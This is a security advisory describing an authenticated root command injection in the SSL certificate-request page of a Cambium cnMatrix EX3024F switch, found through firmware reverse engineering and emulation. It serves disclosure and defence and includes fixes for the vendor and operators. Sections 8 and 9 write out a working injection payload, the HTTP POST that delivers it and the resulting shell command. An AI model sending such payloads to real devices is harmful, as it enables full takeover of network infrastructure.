# Cambium cnMatrix EX3024F — Command Injection in SSL Certificate CSR Generation (Root RCE)

Advisory: https://0day-rubbish.com/blog/cambium-cnmatrix-ssl-csr-command-injection
Repository: https://github.com/Exploit-Garbage/0day-Rubbish
Contact: disclosure@0day-rubbish.com

## 1. Overview

### Overview of the finding

A command injection vulnerability exists in the SSL digital certificate management
page of the Cambium cnMatrix EX3024F managed switch. The `COMMON_NAME` form field
submitted to `POST /iss/specific/ssl_digitalcert.html` is forwarded, with no
metacharacter filtering, through five successive functions inside the management
daemon until it is interpolated into a shell command string that is passed to
`system()`. Section 7 enumerates all five. Because the management daemon `ISS.exe`
runs with full root privileges on the switch, an authenticated administrator can
execute arbitrary operating system commands as `uid=0`.

The affected component is a 93 MB stripped ELF binary for ARM aarch64 (Marvell
switch platform, Senao OEM), which implements the entire web management interface.
It is fronted by `lighttpd` and ships in a `cpio`-packed initramfs that also
contains a `busybox` binary. That this `busybox` supplies the `/bin/sh` which
`system()` invokes is an inference from the emulation setup described in section 9,
where the loader prefix resolves the child shell for the emulated process — it is not
a property established from the device itself.

All work described in this advisory was performed against an **extracted firmware
image** and, for dynamic confirmation, under **`qemu-aarch64-static` user-mode
emulation** of the extracted root filesystem. No physical device was available and
no physical device was tested. The distinction between what was proved statically,
what was executed dynamically, and what remains inferred is stated explicitly in
section 9.

### Overview of affected scope

Verified: Cambium cnMatrix **EX3024F**, firmware **6.2.1-r4** — the only model and
the only firmware revision executed in this research. Section 10 discusses the basis
and the limits of any broader applicability claim.

## 2. Vulnerability Summary

### Vulnerability summary

The vulnerable code builds an `openssl req` invocation with `snprintf()` and then
hands the resulting string to `system()`. The certificate subject is placed inside
a double-quoted `-subj "%s"` argument. The subject originates from the
`COMMON_NAME` HTTP POST parameter, and the only transformation applied to it on its
way to the sink is percent-decoding. A literal double quote in `COMMON_NAME`
therefore terminates the quoted argument, and the shell metacharacters that follow
(`;`, `|`, `` ` ``, `$()`) are parsed as commands.

The injection is not constrained by the length of the field: the parameter is
copied with `strncpy(..., 100)`, and the command buffer used for the final
`snprintf(..., 0x400, ...)` is 1 KB, so realistic payloads fit comfortably.

Prerequisites: a valid authenticated session with administrative privilege. The
injected command executes as `root` in the context of the management daemon.

Independence: the cnMatrix product line had no published CVE records at the time
this research was performed. Cambium Networks does have prior public
command-injection and code-injection advisories on the sibling ePMP and cnPilot
product lines (CVE-2017-5261 and CVE-2022-35908, both in diagnostic ping/traceroute
handling; CVE-2023-6691, a code injection issue), and a prior authentication bypass
(CVE-2017-7918). This finding is on a different code path — SSL certificate signing
request generation in the cnMatrix management daemon — and was reached by
independent static analysis rather than by porting a known pattern. The
CVE-2017-7918 authentication bypass technique was specifically tested against this
build and is ruled out (section 3). This is a previously unreported vulnerability,
not a re-publication of an existing one.

## 3. Authentication Boundary

### Authentication model and dispatch ordering

The request dispatcher `ProcessHttpReq` (at file offset `0x01263ff4` in the shipped
binary) handles the SSL certificate page as page type 4 and calls
`WebnmAuthenticate(param_1, ...)` **before** it calls `IssProcessSpecificPage(param_1)`.
An authentication failure returns from the dispatcher before the page handler is
ever entered. No dispatch path was found in which the POST/Set handler for this page
can execute without a prior successful authentication decision.

### Authentication enforcement

`WebnmAuthenticate` (`0x01271f9c`) consults the global flag `gb1HttpLoginReq`
(`0x0558fbb5`). In the shipped image this variable is located in `.data` with
`isInitialized=True` and a value of `0x01`, i.e. login is **enforced by default**.
When the flag is `1` the function performs the full `IssAuthenticate` credential
check; the `gb1HttpLoginReq != 1` no-authentication branch exists in code but is not
reachable in the shipped default configuration.

`IssAuthenticate` (`0x01273548`) implements two cases. If a `Gambit` parameter is
present, it is decoded with `WebnmDecode` and parsed with
`sscanf("%u:%u:%1023s", &session_id, &uptime, &login:passwd)`; the result is checked
by `CliCheckUserPasswd` and then by `IssVerifyLogin`, which validates the entry
against the server-side session table (`WebNMCheckUserEntry`) **and** requires
privilege mask `0xf` (administrator). If `Gambit` is absent, the request path is
matched against a static allowlist of page names by a `strstr` loop; a non-match is
rejected.

The `Gambit` token is produced by `WebnmEncode("%u:%u:%s:%s", session_id, uptime,
login, passwd)`, where `session_id` is a server-side monotonic counter held in
`DAT_06559d14`. Every request re-validates the token against the live session
record list (`WebnmUserRecord`). The token cannot be forged without a successful
login.

### Authentication bypass attempts

Four concrete bypass hypotheses were tested and all were refuted:

1. The static page allowlist (`0x03b3c558`, 69 entries) consists solely of static
   assets and does **not** contain `ssl_digitalcert.html`.
2. `HttpProcessReqLine` (`0x01265450`) splits the request line into the path
   (offset `0x58`, truncated at the first `?`) and the query string (offset
   `0x4354`, a separate buffer). Query-string smuggling such as
   `?x=dummy.html` therefore never reaches the `strstr(page_url, ...)` allowlist
   comparison.
3. The `gb1HttpLoginReq == 0` no-authentication branch is not reachable in the
   shipped default image.
4. The `DEFAULT_CREDENTIALS` structure (`0x06552b88`) is zero-initialized in `.bss`
   in the shipped image. It is populated only transiently for an `admin/admin` login
   attempt, and its use remains allowlist-gated; it provides no credential shortcut.
   That transient in-code population is the single occurrence of `admin/admin` in the
   research record for this finding, which is what makes the credential defaults built
   into the published proof-of-concept script auditable as tester conveniences rather
   than as documented device credentials.

Conclusion: reaching the vulnerable page requires an authenticated administrator
session. This is a post-authentication finding, and section 12 gives both the
strict reading and the deployment-dependent upper bound.

## 4. Attack Surface

### Attack surface enumeration

The web interface is served under two URL namespaces: `/wmi/` (login and logout) and
`/iss/` (all configuration pages). Every authenticated page URL carries the session
token as `?Gambit=<token>`.

`ISS.exe` is a monolith built on a vendor web framework whose naming conventions
map directly onto its architecture, which made systematic enumeration practical:

- `IssProcess<Page>Page` — combined Get/Set handler for a configuration page.
- `<page>Access` — per-page authorization predicate.
- Functions with an `Ar` suffix (for example `SslArGenServerCertReq`) — action
  routines.
- Functions with a `Cli` prefix or infix (for example `SslCliGenCertReq`) —
  command-line interface handlers that the web layer calls as a bridge.

Web-reachable code reaches operating-system command execution either through the
CLI bridge (`CliExecuteCliCmd`) or through direct `Ar` action calls. Sink anchors
were located first by string search over `.rodata`: the format strings
`Failed: system command %s` (at `0x03acc9c0`) and `Failed: popen for cmd %s` (at
`0x03acc838`) identify the `system()` and `popen()` wrappers used throughout the
daemon. Cross-referencing those wrappers surfaced the SSL digital certificate page
as the cleanest user-controlled `system()` sink.

The HTML form for the page is embedded in the `.data` section of the binary rather
than read from disk, so it was recovered from the image itself.

## 5. Sink Identification

### Sink identification

The sink is `SslGenCertRequest` at `0x00f98fec`. Recovered decompilation,
condensed to the control flow that matters:

```c
undefined8 SslGenCertRequest(uint param_1, undefined8 param_2, undefined8 param_3) {
  // param_1 = key size (0 => default 2048), param_2 = subject, param_3 = output path
  if (param_1 == 0) {
    iVar1 = SslArGetServerCertStatus();
    if (iVar1 == 0) {
      snprintf(acStack_488, 0x80, "-newkey rsa:%u -keyout %s", 0x800,
               "/persist/swconf/sslserverkey");            // 0x800 = 2048
    } else {
      sprintf(acStack_408, "openssl pkey -in %s -out %s %s",
              "/persist/swconf/sslservcert", "/persist/swconf/sslserverkey", "2> /dev/null");
      system(acStack_408);
      snprintf(acStack_488, 0x80, "-new -key %s", "/persist/swconf/sslserverkey");
    }
  } else {
    snprintf(acStack_488, 0x80, "-newkey rsa:%u -keyout %s", (ulong)param_1,
             "/persist/swconf/sslserverkey");
  }
  snprintf(acStack_408, 0x400,
           "openssl req -sha%u -noenc -subj \"%s\" %s -out %s %s",   // <-- subject lands here
           0x100, param_2, acStack_488, param_3, "2> /dev/null");
  local_8 = system(acStack_408);                                    // <-- SINK
  return local_8;
}
```

The second `system()` call is the exploitable one. Its first argument is built by
`snprintf` with `param_2` — the certificate subject — interpolated inside the
double-quoted `-subj "%s"` argument. There is no escaping of `"`, no rejection of
`;`, `|`, `` ` ``, or `$`, and no length reduction. The Bourne shell invoked by
`system()` performs the usual quote processing and command separation, so any
metacharacter inside the attacker-supplied subject escapes the intended argument.

The trailing `2> /dev/null` in the format string is what makes the injection quiet:
`openssl` error output from the now-malformed first statement is discarded, which
reduces the operational noise of an attack but is not itself what enables it.

### Sink invocation context and process account

`SslGenCertRequest` is called synchronously inside the management daemon's request
handling, so the `system()` child process inherits the daemon's credentials. The
daemon runs as `root` on the switch; section 9 confirms this empirically, with the
injected command producing output recorded as `uid=0(root) gid=0(root)`.

Two further functions are pure pass-throughs on the way to the sink and add no
validation:

```c
bool SslArGenServerCertReq(undefined4 param_1, undefined8 param_2, char *param_3) {
  snprintf(acStack_100, 0x100, "/CN=%s", param_2);        // param_2 = user CN, no sanitization
  *(undefined8 *)param_3 = s__tmp_SslServerCertReq_03acd520._0_8_;   // "/tmp/SslServerCertReq"
  iVar2 = SslGenCertRequest(param_1, acStack_100, param_3);
  return iVar2 != 0;
}
```

`SslCliGenCertReq` (`0x00f9c04c`) simply forwards the common name to
`SslArGenServerCertReq`, which prefixes the literal `/CN=` and forwards the result
as the subject. The `/CN=` prefix is not a filter: the injected value starts
immediately after it.

## 6. Source Identification

### Source identification

The HTTP entry point is the POST branch of the SSL digital certificate page
handler. For `REQUEST_TYPE == 1` (generate CSR) the handler performs:

```c
HttpGetValuebyName(..., "COMMON_NAME", ...);      // extract the POST variable
issDecodeSpecialChar(param_1 + 0x6354);           // percent-decode ONLY, no quote filtering
strncpy(acStack_78, param_1 + 0x6354, 100);       // copy, no sanitization
SslLock();
iVar2 = SslCliGenCertReq(local_10, acStack_78, &DAT_070d9eb0);   // key size, COMMON_NAME, outbuf
```

The single most important detail is `issDecodeSpecialChar`. Its only job is to
translate `%XX` escape sequences; it does not neutralize anything. That has two
consequences. First, it is not a filter and must not be mistaken for one. Second,
it means an attacker can percent-encode every metacharacter in the payload and rely
on the server to decode it back into shell-active form after any upstream transport
filtering, proxy inspection, or logging normalisation.

The form recovered from the binary defines the submitted fields: `Gambit`,
`REQUEST_TYPE` (`1` = generate CSR, `2` = enter certificate), `COMMON_NAME` (text
input, `maxlength=100`, the injection vector), `RSA_KEY_BITS` (1024 or 2048),
`DIGITAL_CERTIFICATE` (textarea), and `ACTION=Apply`. The page's client-side
`checkFields()` function requires only that `COMMON_NAME.length > 0` when
`REQUEST_TYPE=1`. There is no server-side counterpart to that check for
metacharacters.

## 7. Data Flow

### Data flow

The complete path from network input to command execution is statically proven
end to end:

```
POST /iss/specific/ssl_digitalcert.html   (Gambit session validated first)
  COMMON_NAME = '";<CMD>;echo "'
  --> HttpGetValuebyName("COMMON_NAME")            page POST handler
  --> issDecodeSpecialChar                         percent-decode only, no filtering
  --> strncpy(buf, COMMON_NAME, 100)               copy, no filtering
  --> SslCliGenCertReq        @ 0x00f9c04c          pass-through
  --> SslArGenServerCertReq   @ 0x00f9a2e0          snprintf("/CN=%s", CN)
  --> SslGenCertRequest       @ 0x00f98fec          snprintf("openssl req ... -subj \"%s\" ...")
  --> system("openssl req -sha256 -noenc -subj \"/CN=\";<CMD>;echo \"\" ...")
  --> /bin/sh parses ';' and executes <CMD> as root
```

There is no sanitisation of `"`, `;`, `|`, `` ` ``, or `$` at any point in the
chain. Five functions stand between the HTTP parser and `system()`, and none of
them validate the data; each only reformats or forwards it.

### Data flow length and payload capacity

Because the subject buffer is 256 bytes (`0x100`) and the command buffer is 1 KB
(`0x400`), an attacker has room for multi-statement payloads: a reverse shell, a
staged downloader, or a persistent configuration modification all fit within the
observed bounds.

## 8. Exploit Construction

### Exploit construction

The payload is a three-part common name that closes the subject quote, runs the
attacker command, and reopens a quote so that the remaining tail of the format
string is absorbed by a harmless `echo`:

```
";<CMD>;echo "
```

Submitted as a normal form POST with a valid session token:

```
POST /iss/specific/ssl_digitalcert.html HTTP/1.1
Content-Type: application/x-www-form-urlencoded

Gambit=<session-token>&REQUEST_TYPE=1&COMMON_NAME=%22%3Bid%3Becho%20%22
&RSA_KEY_BITS=2048&DIGITAL_CERTIFICATE=&ACTION=Apply
```

For command output to be observed rather than discarded into `/dev/null`, the
injected statement should redirect to a file the attacker can later read back
through another authenticated function, or to a network channel under the
attacker's control.

A complete proof-of-concept script is published alongside this advisory at
`exploit/cambium_cnmatrix_ssl_csr_cmd_injection_rce.py`. It uses only the Python
standard library, takes target host, port, credentials and command as arguments,
performs the login to obtain the session token, and then issues the injection POST.

## 9. Dynamic Verification

### Dynamic verification method

The management daemon cannot complete initialisation under `qemu-aarch64-static`
user-mode emulation. Its `platformInit` requires the Marvell switch ASIC driver
(`libswd.so` and the device node `/dev/mvMbusDrv`), which does not exist in
emulation; initialisation fails with a platform-init error and no HTTP port is ever
bound. Confirming the sink dynamically therefore required exercising the real sink
function inside the real binary directly, under debugger control, rather than
driving it through the network stack. This is stated plainly because it is a
meaningful limitation: **end-to-end HTTP exploitation was not performed against a
device**, and no physical hardware was used at any point.

The harness launched the extracted `ISS.exe` under emulation, frozen at the ELF
entry point via the `-g` flag, with `QEMU_LD_PREFIX` pointed at the extracted root
filesystem:

```
QEMU_LD_PREFIX=<rootfs> \
  qemu-aarch64-static -L <rootfs> -g 12345 <rootfs>/usr/bin/ISS.exe
```

Setting `QEMU_LD_PREFIX` is essential to the semantics of the test: qemu-user
prefixes `execve` arguments with it, so the `system()` child resolves `/bin/sh` to
the aarch64 `busybox` shell contained in the extracted root filesystem — the binary
the device ships. That a real device resolves the same shell for `system()` is an
inference from this loader behaviour, not an observation. `QEMU_LD_PREFIX` does
**not** prefix `open()` paths, so a file written by the injected command appears on
the harness host filesystem, where it can be inspected as evidence.

The debugger script allowed the guest to run forward to its first `printf` so that
libc and the PLT were fully relocated, then invoked the sink. The block below is
condensed from the recorded script — the full session also sets the target
architecture, places breakpoints on two further library output functions, enables
unwind-on-signal and prints registers. The `call` line is byte-identical to the
recorded one:

```
break printf
continue
delete
call ((long(*)(long,long,long))0xf98fec)(0, "/CN=\";id>/tmp/marker_ssl;echo \"", "/tmp/test_csr")
detach
```

Calling the function before libc initialisation completes faults at `malloc@plt`;
the breakpoint-and-continue sequence is what makes the call well-defined.

### Dynamic verification result

The call returned `0`, meaning the internal `system()` returned success and no
signal or crash occurred. The marker file written by the injected `id` command was
then inspected on the harness host:

```
-rw-r--r-- 1 root root 36 <timestamp> /tmp/marker_ssl
uid=0(root) gid=0(root)
3fed61387f022fa06e4d4d787b63925c  /tmp/marker_ssl
```

The file is 36 bytes and is owned by `root`. The block above reproduces the recorded
evidence in abbreviated form, and the two abbreviations are deliberate. First, the
listing line's timestamp is replaced by `<timestamp>`, because no date is reproduced
anywhere in this advisory. Second, the third field of the recorded `id` output — the
group list, which the emulated busybox rendered in the device's own locale — is
omitted here, because this document is English-only text and that field is not
English. The two fields shown are reproduced verbatim, and both record `0`. The MD5
digest above is that of the marker file exactly as written on the harness host,
including the field omitted here.

This demonstrates that the real, shipped `SslGenCertRequest` function passed the
attacker-controlled subject to `system()`, that the Bourne shell split the command
at the injected semicolon, and that the injected statement executed with
`uid=0`.

### Dynamic verification of the reconstructed command line

With `param_1 == 0` and `SslArGetServerCertStatus() == 0`, the string handed to
`system()` was:

```
openssl req -sha256 -noenc -subj "/CN=";id>/tmp/marker_ssl;echo "" -newkey rsa:2048 -keyout /persist/swconf/sslserverkey -out /tmp/test_csr 2> /dev/null
```

The shell parses this as three statements. The first, `openssl req -sha256 -noenc
-subj "/CN="`, runs and may fail — irrelevant to the outcome. The second,
`id>/tmp/marker_ssl`, executes and writes the root-owned marker. The third, `echo ""
-newkey rsa:2048 -keyout ... -out ... 2> /dev/null`, is absorbed by `echo`.

### Dynamic verification limits

What is dynamically proven is that the sink executes an injected command as root
when called with the payload an HTTP POST would deliver. What is statically proven
only is that the HTTP path delivers that payload: the five-handler chain in section
7 was established by decompilation and cross-reference, not by an observed network
request. The dynamically exercised function is the same function the HTTP path
reaches, and the payload used is byte-for-byte what the HTTP path would construct.
This is strong evidence but it is not equivalent to a reproduced network
exploitation, and it should be read as such.

## 10. Reachability and Security Impact

### Reachability

Reachability from the network requires only that the management interface be
reachable and that the attacker hold administrative credentials. Nothing beyond the
shipped default is needed: authentication is enforced by default in the released
image, where the enforcement flag is initialised to `1`, and the SSL certificate page
is registered in the daemon's own page table alongside the other configuration pages.

A structured exhaustion review of the unauthenticated attack surface was carried
out before concluding that authentication is genuinely required. It covered five
dimensions: the complete page table and each page's authorization predicate;
pre-authentication HTTP parsing code; non-web network services and init daemons in
the root filesystem; CLI-backend reachability from unauthenticated contexts; and
memory corruption on the authentication path itself. Two independent adversarial
passes specifically attempted to refute the conclusion that unauthenticated
execution is impossible. No unauthenticated path to command execution was found.

### Reachability with weak credentials

The practical severity depends heavily on the deployed administrative password. The
shipped image contains no hardcoded credential shortcut: the default-credentials
structure is zero-initialized, and no credential shortcut was demonstrated anywhere
in this research.

What follows is an operational-posture observation about how switches of this class
are commonly deployed. It is not a finding of this research, and no artifact in the
record measures it: in a deployment that has never changed the administrator
credential and that exposes the management interface on a production or management
VLAN, the authentication prerequisite is in practice a formality.

Impact once the chain completes: arbitrary root command execution on a managed
switch. On the evidence of this research that means full compromise of the device —
arbitrary rewriting of the running and persisted configuration, installation of a
persistent backdoor that survives reboot, use of the switch as a pivot into adjacent
network segments, and live manipulation, redirection or denial of the traffic the
switch carries. For an aggregation or access switch in an operational network this is
complete compromise of a forwarding-plane device, not merely compromise of a
management plane.

### Reachability across models and firmware revisions

Only the EX3024F build of firmware 6.2.1-r4 was verified. The SSL CSR code lives
inside a vendor web framework binary whose structure (the `Ar`/`Cli`/`IssProcess`
naming scheme and the shared `system()` wrappers) indicates it is a common
framework used across the product family, so other cnMatrix models and other
firmware revisions plausibly carry the same `SslGenCertRequest` code. That is an
inference from code structure only. No other build was executed in this research, and
the affected scope claimed by this advisory is deliberately held to the single model
and firmware revision it verified. Any statement beyond "cnMatrix EX3024F, firmware
6.2.1-r4, verified" should be treated by defenders as unconfirmed and requiring its
own validation.

## 11. Fix Recommendations

### Fix recommendations for the vendor

1. Do not build shell command strings from user input. Invoke `openssl` with
   `execve()`/`posix_spawn()` and an argument vector so that the subject is passed
   as a single opaque argument rather than as shell text. This removes the entire
   class rather than the instance.
2. If `system()` must be retained, validate the subject against a strict
   allowlist. An X.509 distinguished-name common name legitimately needs only
   alphanumerics, spaces, and the characters `. , - _ ' ( ) / = : @` after
   normalization; reject anything else, including `"`, `;`, `|`, `` ` ``, `$`,
   `(`, `)`, `<`, `>`, newline, and backslash.
3. Apply the same validation before writing the value into any persisted
   configuration, so that a validated value cannot later be re-read and
   re-interpolated into a different command string elsewhere.
4. Audit every caller of the `system()` and `popen()` wrappers identified by the
   `Failed: system command %s` and `Failed: popen for cmd %s` format strings. The
   same interpolation pattern is likely present on other diagnostic and
   certificate-related pages.
5. Drop privileges. A daemon that only shells out to `openssl` for certificate
   operations does not need to run its request handling as `root`; a
   least-privilege split would convert this from full device compromise into a
   bounded failure.
6. Percent-decoding is not sanitisation. Ensure `issDecodeSpecialChar` is not
   relied upon as a security control anywhere, and re-validate after decoding.

### Fix recommendations for operators

Until a fixed build is available: restrict the management interface to a
dedicated, tightly controlled management network or to an out-of-band management
port; place it behind an authenticating reverse proxy or VPN where possible;
enforce a strong, unique administrative password and disable any unused default
accounts; and monitor for CSR generation requests whose `COMMON_NAME` contains
quote or command-separator characters, which have no legitimate value in a
certificate subject.

## 12. CWE and CVSS

### CWE mapping

- **CWE-78: Improper Neutralization of Special Elements used in an OS Command
  ('OS Command Injection')** — primary. An externally influenced value is placed in
  a string passed to `system()` without neutralization of shell metacharacters.
- **CWE-20: Improper Input Validation** — contributing. The only input processing
  is percent-decoding; the field's server-side validation is limited to a length
  copy and a client-side non-empty check.
- **CWE-250 / CWE-269** are relevant to remediation priority rather than to the
  vulnerability itself: the management daemon executes at `uid=0`, which is what
  elevates an injection into full device compromise.

### CVSS vector derivation

The research record for this finding carries a base score of 8.8 together with the
vector `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`. This advisory does not adopt
that recorded vector, and the derivation below is ours: every metric is taken from the
documented facts of the analysis, and every candidate is computed with the CVSS v3.1
base metric algorithm.

| Metric | Value | Documented basis |
|---|---|---|
| Attack Vector | Network (N) | Reached over HTTP against the management interface |
| Attack Complexity | Low (L) | One deterministic POST; no race, no memory-layout dependency, no special state |
| Privileges Required | High (H) | Administrative account required: privilege mask `0xf` plus write RBAC, enforced by a server-side session table |
| User Interaction | None (N) | No action by any other user is needed |
| Scope | Unchanged (U) | The daemon already runs as `root`; the injected command executes in the same trust domain as the vulnerable component, so no authority boundary is crossed |
| Confidentiality | High (H) | Root command execution gives unrestricted read access to the device's configuration and filesystem |
| Integrity | High (I) | Root shell rewrites configuration and can install persistent code |
| Availability | High (H) | Root shell can halt forwarding, drop configuration, or reboot the switch |

`CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H` computes to **7.2 (High)**.

### CVSS reconciliation with the recorded score

The recorded score and the recorded vector agree with each other: 8.8 is exactly the
base score of `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`, the vector the research
record itself carries. The disagreement between that record and this advisory is
therefore about one metric, not about arithmetic. `PR:L` presumes that any
low-privileged user can reach the sink; the analysis documents an administrator-only
gate — privilege mask `0xf` plus write RBAC, enforced by a server-side session table
(section 3) — so `PR:H` is the faithful metric, and this advisory derives
**7.2 (High)** instead. The recorded 8.8 understates the privilege the chain demands.

Scope was deliberately not set to Changed. The changed-scope reading does compute
higher, and its arithmetic is reproducible: under `S:C` the `PR:H` weight is 0.50
rather than the 0.27 used when scope is unchanged, giving Exploitability
`8.22 x 0.85 x 0.77 x 0.50 x 0.85 = 2.286496`, while Impact for changed scope is
`7.52 x (0.914816 - 0.029) - 3.25 x (0.914816 x 0.9731 - 0.02)^13 = 6.128026`, and the base score is
therefore Roundup(1.08 x 8.414522) = 9.1: `CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H` computes to **9.1 (High)**.
That changed-scope vector is rejected here, not because of its arithmetic, but because
the compromised operating system and the vulnerable daemon sit inside one
authorization domain — the daemon is already root over that operating system.

### CVSS dual reading for unauthenticated reach

The chain is authenticated only in the sense that a valid administrative session
must be presented. The shipped image contains no verified factory-default
credential: the default-credentials structure is zero-initialized in the released
binary and no credential shortcut was demonstrated. On the evidence available, the
correct score is the post-authentication 7.2 above.

The second reading is an operational-posture figure. It is contingent on the
deployment rather than on the code, it is not a finding of this research, and no
artifact in the record establishes `PR:N` on this firmware. Where an installation
retains a default, weak, or publicly known administrator password, the privilege
prerequisite collapses in practice while the technical chain is unchanged. For that
posture the corresponding vector is `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` = **9.8 (Critical)**.

Defenders should carry both, but should not confuse their status: **7.2** is the
evidence-backed baseline reflecting the verified authentication requirement, while
**9.8** is a deployment-conditional planning figure for any device whose
administrative password is not known to be strong and unique — not a CVSS reading
supported by evidence about this firmware. For completeness, the proof-of-concept
script's built-in credential defaults are argument conveniences for the tester and
are not evidence of any shipped credential.

### CVSS summary

Primary: **7.2 (High)** — `CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H`.
Deployment-conditional planning figure: **9.8 (Critical)** — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`.
